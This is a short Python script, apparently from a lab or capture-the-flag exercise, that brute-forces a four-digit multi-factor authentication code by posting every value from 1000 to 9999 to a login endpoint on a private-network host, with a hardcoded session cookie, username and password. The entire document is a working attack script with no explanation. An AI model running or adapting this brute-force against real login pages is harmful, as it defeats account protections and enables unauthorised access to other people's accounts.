import requests


for i in range(1000, 10000):
    x = requests.post("http://10.10.15.20/console/mfa.php", cookies={"PHPSESSID": "igpo2dvrh3cic02ouiqaie98hg", "user": "jason_test_account", "pwd": "violet"}, data={"code": f"{i}"})
    print(i)
    if "Incorrect" not in x.text:
        print("Your code is", i)
        break
